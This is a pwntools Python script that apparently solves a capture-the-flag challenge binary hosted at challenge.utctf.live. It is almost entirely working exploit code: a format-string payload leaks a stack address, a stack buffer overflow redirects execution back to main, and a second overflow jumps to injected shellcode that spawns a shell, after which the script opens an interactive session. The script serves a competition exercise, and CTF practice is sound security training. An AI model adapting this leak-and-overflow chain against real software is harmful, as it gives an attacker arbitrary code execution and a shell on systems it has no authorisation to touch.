#!/usr/bin/env python3
from pwn import *
elf = ELF("./shellcode_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hb', '-F', '#\x7bpane_pid\x7d', '-P']

def conn():
    if args.REMOTE:
        # nc challenge.utctf.live 9009
        # io = remote(args.HOST, args.PORT)
        io = remote('challenge.utctf.live', 9009)
    elif args.GDB:
        gdbscript = """
            b * 0x00400637
            b * 0x00400724
            c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = process([elf.path])
    return io

# def encode(s):
#     out = ""
#     for c in s:
#         if c.isalpha():
#             if c.islower():
#                 out += chr(0xdb - ord(c))
#         else:
#             out += c
#     return out

r = conn()

_data = 0x00601040
# your solution here
payload = b"%17$p %%"
payload = payload.ljust(0x30, b'\x00')
payload += p64(_data)
payload += b'\x00' * 0x10
payload += p64(elf.symbols['main'])   

r.sendlineafter(b': \n', payload)
leak = r.recvuntil(b'%')
leak = int(leak[:-1], 16)
rsp = leak - (0x00007fff2088ad38 - 0x7fff2088ac68 - 0x20)
print(hex(rsp))

target_rsp = rsp + 0x10
shellcode = asm(shellcraft.amd64.linux.sh())
payload = b'\x00' * 0x30
payload += p64(_data)
payload += b'\x00' * 0x10
payload += p64(target_rsp)
payload += b'\x00' * 0x30
payload += shellcode
r.sendlineafter(b': \n', payload)

r.interactive()
